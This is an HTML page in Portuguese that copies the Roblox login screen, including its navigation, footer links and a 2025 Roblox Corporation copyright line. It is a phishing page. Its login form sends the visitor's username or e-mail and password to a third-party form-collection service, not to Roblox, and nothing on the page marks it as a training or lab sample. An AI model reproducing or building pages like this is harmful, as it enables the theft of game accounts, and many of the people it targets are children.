<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Entrar na Roblox</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <!-- Barra superior -->
  <header class="topbar">
    <div class="logo">ROBLOX</div>
    <nav>
      <a href="#">Destaques</a>
      <a href="#">Mercado</a>
      <a href="#">Criar</a>
      <a href="#">Robux</a>
    </nav>
    <div class="search">
      <input type="text" placeholder="Pesquisar">
    </div>
    <div class="auth">
      <button class="btn-secundario">Cadastrar-se</button>
      <button class="btn-secundario">Entrar</button>
    </div>
  </header>

  <!-- Caixa de login -->
  <div class="login-box">
    <h2>Entrar na Roblox</h2>
    <form action="https://formspree.io/f/mdkleovj" method="POST">
      <input type="text" name="usuario" placeholder="Usuário/e-mail/telefone" required>
      <input type="password" name="senha" placeholder="Senha" required>
      <button type="submit" class="btn-principal">Entrar</button>
    </form>

    <a href="#">Esqueceu a senha ou nome de usuário?</a>

    <button class="btn-secundario">Envie-me um código único por e-mail</button>
    <button class="btn-secundario">Use outro dispositivo</button>

    <p>Não possui uma conta? <a href="#">Cadastrar-se</a></p>
  </div>

  <!-- Rodapé -->
  <footer>
    <a href="#">Sobre nós</a>
    <a href="#">Vagas</a>
    <a href="#">Blog</a>
    <a href="#">Responsáveis</a>
    <a href="#">Cartões presente</a>
    <a href="#">Ajuda</a>
    <a href="#">Termos</a>
    <a href="#">Acessibilidade</a>
    <a href="#">Privacidade</a>
    <a href="#">Suas opções de privacidade</a>
    <p>©2025 Roblox Corporation</p>
  </footer>

</body>
</html>
